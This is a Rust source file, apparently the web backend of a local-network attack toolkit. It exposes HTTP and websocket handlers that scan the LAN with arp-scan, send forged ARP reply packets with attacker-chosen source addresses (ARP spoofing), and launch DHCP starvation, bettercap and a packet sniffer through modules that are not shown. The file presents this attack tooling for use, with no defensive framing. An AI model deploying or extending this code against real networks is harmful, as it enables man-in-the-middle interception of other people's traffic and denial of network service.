use std::net::Ipv4Addr;
use std::str::FromStr;

use axum::Json;
use pnet::datalink::{self, NetworkInterface};

use pnet::packet::arp::ArpOperations;
use pnet::util::MacAddr;
use serde::Deserialize;
use serde::Serialize;
use std::process::Command;
mod arp_sender;
use axum::extract::Query;
use axum::extract::connect_info::ConnectInfo;
use axum::{
    extract::ws::WebSocketUpgrade,
    response::IntoResponse
};
use axum_extra::TypedHeader;

mod dhcp_pig;
mod bettercap_launcher;
mod sniffer;

#[derive(Serialize, Deserialize)]
struct Interface {
    name: String,
    ips: Vec<String>,
    mac: String,
}

#[derive(Serialize, Deserialize)]
pub struct ARPAttackInfo {
    name: String,
    src_ip: String,
    // mac: String,
    target_ip: String,
    target_mac: String
}

pub async fn get_interfaces() -> String {
    let interfaces: Vec<NetworkInterface> = datalink::interfaces();
    let mut interfaces_name: Vec<Interface> = vec![];
    interfaces.iter().for_each(|x| {
        interfaces_name.push(Interface {
            name: x.name.clone(),
            ips: x.ips.iter().map(|f| f.ip().to_string()).collect(),
            mac: x.mac.unwrap_or(MacAddr::zero()).to_string(),
        })
    });
    serde_json::to_string(&interfaces_name).unwrap()
}

#[derive(Serialize, Deserialize)]
pub struct ARPDevice {
    vendor: String,
    ip: String,
    mac: String,
}

#[derive(Debug, Deserialize)]
#[allow(dead_code)]
pub struct Params {
    // #[serde(default, deserialize_with = "empty_string_as_none")]
    interface: Option<String>,
}

pub async fn arp_scan(Query(params): Query<Params>) -> String {
    let raw_res = Command::new("arp-scan")
    .arg("--interface=".to_owned() + params.interface.unwrap().as_str())
    .arg("--localnet")
    .arg("--format='${ip}|${mac}|${vendor}'")
    .output()
    .expect("failed to execute process");
    let res = String::from_utf8_lossy(&raw_res.stdout);
    let mut lines: Vec<&str> = res.lines().collect();
    lines.remove(0);
    lines.remove(0);
    lines.pop();
    lines.pop();
    let mut devices: Vec<ARPDevice> = vec![];
    for line in lines {
        let device: Vec<&str> = line.split('|').collect();
        if device.len() > 1{
            devices.push(ARPDevice { vendor: device[2].to_string() , ip: device[0].to_string(), mac: device[1].to_string() })
        }
    }
    serde_json::to_string(&devices).unwrap()
}

pub async fn send_arp_packet(Json(payload): Json<ARPAttackInfo>) -> String {
    let interfaces: Vec<NetworkInterface> = datalink::interfaces();
    let interfaces_filtered: Vec<NetworkInterface> = interfaces
        .iter()
        .map(|v| v.clone())
        .filter(|sen| sen.name == payload.name)
        .collect();
    let interface = interfaces_filtered[0].clone();
    let src_ip = Ipv4Addr::from_str(payload.src_ip.as_str()).unwrap();
    let src_mac = interface.mac.unwrap();
    let target_ip = Ipv4Addr::from_str(payload.target_ip.as_str()).unwrap();
    let target_mac = MacAddr::from_str(payload.target_mac.as_str()).unwrap();
    arp_sender::send_arp_packet(
        interface,
        src_ip,
        src_mac,
        target_ip,
        target_mac,
        ArpOperations::Reply,
    );
    "ok".to_string()
}

pub async fn get_routes() -> String {
    let raw_res = Command::new("route")
    .output()
    .expect("failed to execute process");
    String::from_utf8_lossy(&raw_res.stdout).to_string()
}

use std::net::SocketAddr;

pub async fn dhcp_starvation_handler(
    ws: WebSocketUpgrade,
    user_agent: Option<TypedHeader<headers::UserAgent>>,
    ConnectInfo(addr): ConnectInfo<SocketAddr>,
) -> impl IntoResponse {
    dhcp_pig::_dhcp_pig_handler(ws, user_agent, ConnectInfo(addr))
}

pub async fn bettercap_handler(
    ws: WebSocketUpgrade,
    user_agent: Option<TypedHeader<headers::UserAgent>>,
    ConnectInfo(addr): ConnectInfo<SocketAddr>,
) -> impl IntoResponse {
    bettercap_launcher::_bettercap_handler(ws, user_agent, ConnectInfo(addr))
}

pub async fn sniffer_handler(
    ws: WebSocketUpgrade,
    user_agent: Option<TypedHeader<headers::UserAgent>>,
    ConnectInfo(addr): ConnectInfo<SocketAddr>,
) -> impl IntoResponse {
    sniffer::_sniffer_handler(ws, user_agent, ConnectInfo(addr))
}